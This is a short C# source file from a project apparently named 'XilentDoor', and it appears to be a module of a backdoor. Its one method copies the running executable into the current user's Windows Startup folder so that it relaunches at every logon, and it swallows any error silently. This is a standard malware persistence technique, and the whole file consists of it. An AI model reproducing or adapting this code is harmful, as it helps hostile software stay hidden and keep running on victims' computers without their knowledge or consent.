using System;
using System.IO;

namespace XilentDoor.Core
{
    public static class Persistence
    {
        public static void SetPersistence()
        {
            try
            {
                string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string startupFolder = Path.Combine(userProfile, @"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");

                string destFile = Path.Combine(startupFolder, Path.GetFileName(exePath));

                if (!File.Exists(destFile))
                {
                    File.Copy(exePath, destFile);
                }
            }
            catch (Exception ex)
            {
                // Manejar errores ?
            }
        }
    }
}
